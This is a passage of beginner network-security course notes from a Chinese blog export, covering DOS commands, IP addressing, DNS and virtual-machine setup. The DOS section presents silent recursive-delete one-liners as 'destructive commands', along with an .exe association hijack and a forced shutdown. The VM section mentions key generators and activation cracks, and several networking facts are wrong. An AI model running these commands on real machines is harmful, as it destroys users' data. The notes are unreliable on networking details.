回显，屏幕上打印一含字符串 扩展： echo [字符串] &gt; [文件名称] #输出字符串到文件中。 echo[字符串] &gt;&gt; [文件名称] #追加字符串到文件中。 [命令] &gt;&gt; 输出信息.txt #将命令运行得到的正确信息提示输入 [命令] 2&gt;&gt; 错误提示.txt # 将命令运行得到的错误信息提示输入 命令 type [haha.txt] 打印显示文件内容，支持文本，word。不支持图片 命令 del [文件名称] […] 删除文件。 区别于 rd。后者是删除空文件夹。/s 递归删除。 del *.txt # 删除所有文本文件 del *.doc # 删除所有word 文件 del * . * /q # 删除该路径下所有文件，无提示执行 del * .* /s /q # 递归删除该路径下所有文件。包括子文件中的文件 命令 [命令] 1&gt;nul 2&gt;nul 屏蔽掉命令执行过程中得到的错误提示，或者正确提示。 ‘1&gt;’：表示正确提示 “2&gt;”：表示错误提示 “nul”：表示空，输出到空域，即不保存。 命令 ren [文件名] [新文件名] 重命名文件，文件夹 rename = ren 命令 attrib [+/- s] [+/-h] [文件/文件夹名称] attribute 属性 修改文件或文件夹属性 s：system 系统级属性 h：hide 隐藏属性 r：只读属性 命令 shutdown -s 关机，注销，睡眠等功能。 shutdown -s -t 60 -f # 60秒后强制关机！ shutdown -a # abolishi 取消关机 shutdown -r # 重启 shutdown -p # 关机 shutdown -l # 注销 shutdown -h # 睡眠 shutdonw -c “认命吧，别挣扎了！” # 添加关机提示语（content 内容） 扩展 | more 实现分页。 若在屏幕上需要显示的内容太多，加上这个符号可以实现分页。 命令 color ? 改变背景和字体的颜色 默认黑底白字，可以用 0A 改成 黑底绿字。 问好可以回车打出指令说明，或者用 help color 命令 pause 暂停功能 命令 copy / move [源文件路径] [目标路径] copy c:\\aa.txt d:\\bb.txt 将文件 aa 复制到D盘，重命名为 bb move c:\\aa.txt d:\\bb.txt 将文件 aa 移动到D盘，重命名为 bb 1注意：在路径名中含有空格时，一定记得加双引号&quot;c:\\File one\\aa&quot; 命令 copy con [文件] 同时输入多行信息到文件中。 而不是 echo string &gt;&gt; hh.txt 复制控制台(consolon)信息到 文件中。 eg: copy con LOVE.txt Dear SaoGui ​ I Love You for many fears. ​ Now, I tell you! ​ Can You Accept Me? ​ Yours SaoXian ctrl + Z #结束输入 type LOVE.txt Dear SaoGui … 命令 assoc [.txt]=txtfile 修改关联性（associativity / associate）。win10 系统必须取得管理员cmd程序。 以 .txt 结尾的文件关联到 txtfile 类型 破坏性修改 assoc .txt = exefile / assoc .exe = txtfile 相关经验 突然发现，看视频所学到的东西少了点，而且学得很慢。 dos 命令的话，我觉得可以自己找本相关的书系统的学一遍，就很快了。 两条破坏性命令 del *. * /s /q &gt;nul 2&gt; nul #只删除所有文件和子文件夹中文件 rd . /s /q &gt;nul 2&gt;nul # 删除所有文件 和 文件夹 Dos 里面的指令要么是某个英文短语的首字母缩写。要么是某个单词的前三个英文字母。比如，rename = ren，delete = del， make directors = md，remove directors = rd，change directors = cd 等等…… 在 python 代码块里面写内容，关键字有颜色。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DOS命令","date":"2020-07-15T08:08:00.000Z","path":"2020/07/15/2020.07.15 dos命令/","text":"第五章 DOS 命令C: \\WINDOWS \\ system \\ cmd.exe 记住这个路径，C盘下，windows 文件夹下，系统文件夹下，有许多的系统程序，其中就有 Dos 命令输入程序。 常用 Dos 命令 C: \\ Documents and Settings \\ Administrator &gt; C: 表示在 C 盘下 \\ Documents and Settings : 表示路径 ‘&gt;’ : 当前所在路径下进行操作。 上一级命令 cd .. ：cd(change directory) 改变路径，两个 ‘ . ‘ 表示上一级 ‘ . ‘：一个点表示当前目录。rd . /s /q 删除本目录下所有文件。 ‘..’：cd ..\\22 表示返回上一级目录后再打开 22 文件夹。 查看当前路径下所有文件 dir 转到 D 盘，或者其他新的盘符。 d: ：回车后直接打开 D 盘。 新建文件夹 md DiretoryName：make directory 创建文件夹，文件夹名称为 DiretoryName。 文件夹名称参数可以加多个，同时创建多个文件夹，名称间用空格个隔开。 如果想创建包含空格的文件夹名称，那么该名称必须用双引号引起来 打开文件夹 + 补全文件路径 cd + 文件夹前几个字母 + Tab键： 比如该路径下有一个文件夹名称叫：DirectoryName 我要打开它：cd Dir + Tab(补全名称) 就直接出现 cd DirectoryName ，回车即可打开。 Tab 键 可按多次，进行多次匹配。 删除文件夹 rd 文件夹名称 文件夹名称 … : remove directory 删除多个文件夹 注意：默认情况下，该命令只能删除空文件夹。 rd 文件夹名称 /s /q: /s ：是递归删除的意思，容易知道，你在用这个命令删除文件夹时，如果该文件内还有其他文件夹，它是从最里面开始删除的，然后返回上一层继续删，知道达到递归出口。 /q：是 quiet 安静的意思，就是消除删除提示。 /f： 是 forse 强制的意思，某些占用的文件，删不了就强制删除。 相关经验 Dos 命令中的文件路径，一律用反斜杠 “ \\ “。修改符 一律用斜杠”/s /f /q” 每个盘符下的文件夹内都默认会有两个名叫”.” 和 “..”的隐藏文件夹，分别用于 和 返回上一级路径。 win2003 下 dos 命令框中中英文切换，用 ctrl + 空格。 绝对路径，和相对路径。 相对于你当前路径的路径，为相对路径，如一个点 ‘.’ 表示当前路径，’..’ 表示相对当前路径的上一级路径。eg: ..\\456 具体的完整路径名称 如”c:\\windows\\system\\cmd.exe”，为绝对路径。 eg: \\abs\\456 D: \\abs\\11&gt; cd \\abs\\22 # \\ 表示根目录，\\abd\\22 表示从根目录开始找文件夹 22。 D: \\abs\\222&gt; _ 不足 磁盘操作系统如果只学这些个简单的入门命令未免不够系统，也不够深入。具体的进阶dos，可以看菜鸟教程里面的 Dos 手册，或者 w3cschool 的 Dos 手册，后者界面稍微友好一点。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"进制","date":"2020-07-14T09:08:00.000Z","path":"2020/07/14/2020.07.14 进制转换/","text":"第四章 、进制转换数值类型二进制这个比较简单，就不记笔记了。快速的十进制转二进制的话。 256 128 64 32 16 8 4 2 1，然后进行凑数，比如 190 = 128 + 32 + 16 + 8 + 4 + 2 找不大于190最大的数，128 找不大于190-128=62最大的数，32 找不大于62-32=30最大的数，16 找不大于30-16=14最大的数，8 找不大于14-8=6最大的数，4 找不大于6-4=2最大的数，2 十六进制（FE）16 = (1111 1110)2 每位十六进制转化成四位的二进制进制。 反之亦然。 相关经验 除了配置 IP ，每台电脑网卡出厂时，都有一个固化进去的物理地址。俗称 Mac(Media Access Control Address) 地址，物理地址，或者局域网地址。该地址全球唯一，并且跟随你的电脑的一辈子，并且无法更改！能改是能改，但是只能伪改，相当于蒙蔽计算机，但是可能重启后还是原 Mac。该地址由于其唯一性和不可更改性，可以进行跟踪标识。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络术语","date":"2020-07-13T03:08:00.000Z","path":"2020/07/13/2020.07.13网络方面的专用词汇/","text":"网关路由器：使能够访问内外网。 网关： 一个网路的出口，Gateway = GW。 路由器的内网接口，必须配置一个 ip，并且该 ip 一般是该局域网网段内的第一个地址，或者最后一个地址。例如对于网段，192.168.101.0 网段内，路由器的 ip 可以是 192.168.101.1 或者 192.168.101.254。 网关，就是该局域网内外的路由器 ip 地址，一般网关很好猜，只要知道该局域网的网段，一般就是第一个，或者最后一个 ip。 当一台 PC 去访问另外一台 PC 进行通信，首先将自己的 ip 与 目标 ip 进行比较，看是否在同一网段。 如果不在同一网段，那么继续把目标地址 ip，交给网关192.168.101.254。然后网关将在更上一层寻找目标 ip。 DNSDNS：Domain Name Service 域名服务器。 计算机访问一个域名： 1）不知道啥意思，劳资要的是 ip。 2）先问自己，自己是否以前访问过，本地是否有缓存。DNS缓存，该处可以被投毒！！。 3）再问本地解析文件，HOST文件（一般为空，除非人工往里面写过）。 4） 求助于别人，那就是 DNS 服务器，该服务器的 DNS 服务器事先必须知道。可以根据你搜索到的 DNS 服务器进行手动配置。 每个地方都有每个地方的 DNS 服务器，根据地方的发展程度，可能有很多 DNS 服务器，也可能没有 DNS 服务器。 5）如果把 DNS给去掉，那么虽然可以上网，但是呢你在浏览器里面可能就要输入你所需要访问的服务器 ip了！ 常用命令：通过 nslookup(name server lookup) + 域名，可以查看该域名的服务器 ip 地址。 常用命令 ipconfig #查看 IP 地址基本信息 ipconfig /all # 查看 IP 地址详细信息 nslookup www.jd.com # 手动域名解析 ping 192.168.101.2 # 发送网络探测数据包，检测网络连通性 ping -t number 目标 IP # 发送连续的数据包，ctrl + C 停止 ping -n number目标 IP # 修改 ping 包数量为 number ping -l number 目标 IP # 修改 ping 包大小为 number 字节 cls # 清空屏幕 exit # 退出 相关经验 0~255 五类 ip 地址之间还有一些特殊地址。比如：127.0.0.1 是一个回环地址，表示访问自己。 从路由器往下，包括交换机，和若干台 PC 组成一个局域网。 在网络连接的更改适配器中，可以看到自己计算机硬件的网卡。 点击本地连接的网络，右键属性，高级设置，找到（tcp/ip）属性，可以配置ip, 子网掩码，网关，以及 DNS 服务器。 114.114.114.114 中国的通用域名解析服务器。 8.8.8.8 也是一个常用的域面解析服务器但是在美国。一般，简单的 ipv4 地址都在外国。 win + E 打开一页文件管理器。 突然发现，连接电信宽带后，默认的域名解析服务器是 192.168.0.1，该服务器是电信公司局域网的 DNS 中继。访问速度慢，所以我查了一下邵阳地区的 DNS 服务器，然后给配置上了。并且，顺带给手机DNS服务器也更换了，果然快了很多！！！！！ 手机难道没有防火墙吗，为什么可以无限ping呢？","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IP地址","date":"2020-07-11T02:08:00.000Z","path":"2020/07/11/2020.07.11第三章 ip 地址详解/","text":"第三章、IP地址详解。1. 基础概念局域网 一般称为内网。 简单局域网的构成：交换机、网线、PC(其他 IT 终端)。 交换机组建局域网最重要的设备。(很多接口) 路由器使能够访问内外网。（只有两个接口，一个连接交换机，一个链接网络） 比如家里的路由器（杂机），既具有交换机的功能，可以组建局域网，还具有路由器功能，可以连接网络。 ip地址全球的ipv4地址，是由32位2进制组成的。00000000 . 00000000 . 00000000 . 00000000 十进制表示范围：0.0.0.0 ~ 255.255.255.255 表示方法：点分二进制发，将每8位二进制转化成十进制，中间用 ‘.’ 号分割。 子网掩码 局域网通信规则：在同一个局域网中，在同一个网段中才能通信。 eg: 家里的路由器 192.168.1.1 ~ 192.168.1.255。 前三段相同，那前三位就是一个网段。网段只有三种可能，前1，前2，前3 位。 子网掩码：255.0.0.0 — 255.255.0.0 —–255.255.255.0 ip地址做与运算，得到的就是子网掩码可能。多少个255，表示局域网通信的网段为前多少位。 与 255 对应的数字是 ip 中的网络位， 与 0 对应的数字为 ip 中的主机位。 ip地址 ：196.168.101.1 子网掩码：255.255.0.0 表示网络位 196.168.x.x 主机 101.1 IP地址分类 A 类：1-122 默认子网掩码 255.0.0.0 B 类：128-191 ————255.255.0.0 C 类：192-223————255.255.255.0 D 类：224-239 组播地址，路由器，服务器，防火墙许多都用到组播技术。许多个 ip 共用一个组播 ip。 E 类：240-254 科研使用。 目前我们使用的 ip 地址就是前三类地址。 ip地址网段细节 每一段从 1 开始。 每一个网段的最后一个地址，255。表示该网段的广播地址，表示该局域网的全局地址。 主机位不能全为 0， 也不能全是 255。也就是如果主机位是两位，或者三位，那么可以不全为255，或者 0。10.1.0.1~10.1.255.254 = 65536 - 2。 四个 255 表示所有 ip 的全局地址。 经验知识 给一台设备配置网络，首先要找到连接上电脑的网卡。然后，如果是服务器ip, 必须是自己手工配置，不能是自动获取的，以免ip变动。一般只要在网卡所连接的网络上面，右击设置属性就可以。 子网掩码也是占用一个ip地址的，网关其实就是一个局域网的第一个ip，比如192.168.101.1 域名解析DNS，一般用8.8.8.8做备用，192.168.0.1是中国电信的默认DNS。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"虚拟机的安装使用","date":"2020-07-09T17:08:00.000Z","path":"2020/07/10/2020.07.10网安虚拟机安装/","text":"安装VMware workstation (虚拟机 寄居架构) 下载安装程序（百度网盘有） 用密匙生成器，生成激活码 打开后安装虚拟系统。 安装虚拟系统 下载相应的系统镜像文件（百度网盘有winxp 和 win2003的镜像） 找个磁盘空间，建立VM文件夹，里面用来存放虚拟系统的安装路径。 在 VMware 中建立相应的虚拟机，然后从虚拟光驱导入系统镜像。 更改硬件配置，把不需要的打印 和 声卡设备可以移除。 运行虚拟机，按照流程弄好后，用激活码激活windows系统。 运行 VMware 中的 tool ，给系统按照驱动。 控制面板中 关闭防火墙， 关闭自动更新。 做快照 给每一台虚拟机做快照，方便恢复。 克隆（不完全克隆） 从快照中，克隆一个一模一样的虚拟机系统。 修改克隆系统的计算机名，防止重名。 克隆两台win2003 和 winxp win2003 一般为服务器系统。 两台一模一样，仅仅计算机名称不同。 都布置最佳状态快照。 装系统 UItealos 制作系统盘。 驱动精灵可以为新装的系统提供驱动。 系统密匙的话呢，自己从网上找吧。 虚拟机系统总结 由于计算机硬盘资源不足，所以windows 2008 (x2) 和 windows-7(x1) 就暂时不安装了。 下了个暴风激活软件，感觉还可以。可以一键激活 windows 和 office 软件。 后期可能会给我的计算机购买硬盘，以及内存条。最好到同一家店买，然后让店家给个螺丝刀。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"虚拟机架构","date":"2020-07-05T17:08:00.000Z","path":"2020/07/06/2020.07.06入门网络安全系列(BV1uv41167Hk)/","text":"网络安全课程体系计算机 -&gt; 内外 -&gt;（网络漏洞） 互联网、服务器（服务器系统漏洞）。 第一阶段：windows 系统学习，研究。主要是服务器系统学习，其次是个人 PC 服务器。 第二阶段：Centos 、 Linux 系统学习。 第三阶段：代码安全，代码审计，web 页面是由代码编写的。 第四阶段：web 渗透测试，对上线的 web 页面进行渗透测试。 学完之后：安全工程师，系统工程师，网络工程师……. 虚拟环境部署寄居架构虚拟机监视器：运行在宿主机。 虚拟机：可以开多台，运行在虚拟机监视器中。攻击方虚拟机 -&gt; 靶机。 原生架构 虚拟机软件直接安装在计算机硬件上。 虚拟机变成了 -&gt; 虚拟机操作系统。 不依赖于宿主机，更加独立，并且多开操作系统可以同时运行。 – Vmware VMware Workstation（寄居） VMware vSphere（原生） – 微软 Hyper-V（寄居）","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}]